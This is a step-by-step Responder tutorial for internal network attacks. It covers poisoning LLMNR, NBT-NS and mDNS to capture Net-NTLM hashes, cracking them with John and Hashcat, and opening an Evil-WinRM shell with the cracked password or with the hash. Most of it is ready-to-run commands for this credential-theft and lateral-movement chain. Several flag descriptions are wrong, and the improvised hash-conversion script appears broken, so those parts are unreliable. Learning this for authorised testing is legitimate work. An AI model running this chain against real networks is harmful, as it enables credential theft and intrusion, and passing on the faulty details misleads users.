Responder is a powerful man-in-the-middle (MITM) tool used during internal penetration testing or red teaming. It works by poisoning name resolution protocols such as LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS) to intercept authentication requests on a local network. When a system tries to resolve a name that doesn't exist, Responder replies with its own IP address, tricking the system into authenticating to it. This often results in capturing valuable Net-NTLMv1 or Net-NTLMv2 password hashes, which can then be cracked using tools like John the Ripper or Hashcat.

## Installation

1. Install Responder on Kali Linux:

```
sudo apt update && sudo apt install responder
```
   
2. Clone Responder Repository (if needed):

```
git clone https://github.com/lgandx/Responder.git
cd Responder
```
   
### Usage

3. Start Responder (Basic Mode):

```
sudo python3 Responder.py -I eth0
```
   
- -I eth0: Specify the network interface to listen on.        
- Listens for LLMNR, NBT-NS, and mDNS requests to capture hashes.

4. Start Responder with Extended Features:

```
sudo python3 Responder.py -I eth0 -rdw
```
   
- `-r`: Enables LLMNR and NBT-NS poisoning.
- `-d`: DNS spoofing.
- `-w`: Web Server to capture credentials from HTTP requests.
 
5. Capture NTLM Hashes:

- Hashes are stored in `Responder/logs/` and can be cracked using John or Hashcat.

6. Analyzing Captured Hashes:    

```
john --format=NT hashfile.txt
```
   
7. Configure Responder to Redirect SMB/HTTP Requests:

```
sudo python3 Responder.py -I eth0 -rdwh
```
   
### Common Responder Commands

- Start in Listen Mode:

```
sudo python3 Responder.py -I eth0
```
 
- Show Information on Interface:    

```
 sudo python3 Responder.py -I eth0 -w
```
   
- Stop Responder:  

	- Use `CTRL+C` to terminate the process.
 

### Using Responder to Capture Hashes

```
sudo responder -I eth0
```

- `-I eth0`: Replace `eth0` with the network interface you are monitoring.
- Wait for a system to attempt to resolve a non-existent hostname.
- Responder will capture and log Net-NTLM hashes.

Hash example:

Administrator:::37f4e9cbeb85d711:9A4ABD7B2C1E16929D902A48952DAF97:0101000000000000...


Cracking Net-NTLMv2 Hashes with John the Ripper

1. Save the hash in a file called `raw_hash.txt`.    
2. Use the `ntlmv2-to-john.py` script (create if missing):

```
/usr/share/john/run/ntlmv2-to-john.py raw_hash.txt > john_ready.txt
```

If the script does not exist, create it manually:

```
python
#!/usr/bin/env python3
import sys

def parse_ntlmv2(line):
    parts = line.strip().split(":")
    if len(parts) < 5:
        return None
    username = parts[0]
    domain = parts[2]
    challenge = parts[3]
    response = parts[4]
    rest = ":".join(parts[5:])
    return f"{username}${domain}${challenge}${response}${rest}"

if len(sys.argv) != 2:
    print("Usage: ntlmv2-to-john.py <inputfile>")
    sys.exit(1)

with open(sys.argv[1], "r") as infile:
    for line in infile:
        parsed = parse_ntlmv2(line)
        if parsed:
            print(parsed)

```

Make it executable:

```
chmod +x /usr/share/john/run/ntlmv2-to-john.py
```

Crack the hash:    

```
john john_ready.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

Show results:

```
john --show john_ready.txt
```

### Cracking Net-NTLMv2 Hashes with Hashcat

1. Ensure the hash is in correct format:

```
Administrator::DOMAIN:37f4e9cbeb85d711:9A4ABD7B2C1E16929D902A48952DAF97:0101000000000000...
```

Save to `hashcat_hash.txt`

2. Run Hashcat:

```
hashcat -m 5600 -a 0 -O hashcat_hash.txt /usr/share/wordlists/rockyou.txt
```


3. Show results:

```
hashcat -m 5600 hashcat_hash.txt --show
```


### Using Evil-WinRM for Remote Shell Access

Once you crack the password:

```
evil-winrm -i <target-ip> -u <username> -p <password>
```

Or if you have the NTLM hash:

```
evil-winrm -i <target-ip> -u <username> -H <hash>
```


Summary Workflow

1. Run Responder to capture hashes
2. Crack with John or Hashcat
3. Log in using Evil-WinRM if WinRM is enabled
4. Elevate privileges or pivot as needed

This triad (Responder + Cracking + WinRM) forms the foundation of many internal Windows exploitation and lateral movement chains.